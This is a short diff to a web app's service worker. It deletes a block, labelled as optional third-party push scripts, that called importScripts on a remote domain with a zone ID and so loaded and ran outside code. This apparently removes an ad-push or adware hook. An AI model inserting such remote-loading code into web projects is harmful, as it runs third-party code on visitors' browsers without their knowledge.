@@ -99,15 +99,3 @@ self.addEventListener('fetch', (event) => {
     return;
   }
 });
-
-// Optional third-party push scripts (safely guarded)
-self.options = {
-  domain: "5gvci.com",
-  zoneId: 12216492
-};
-self.lary = "";
-try {
-  if (self.navigator && self.navigator.onLine !== false) {
-    importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw');
-  }
-} catch (e) {}
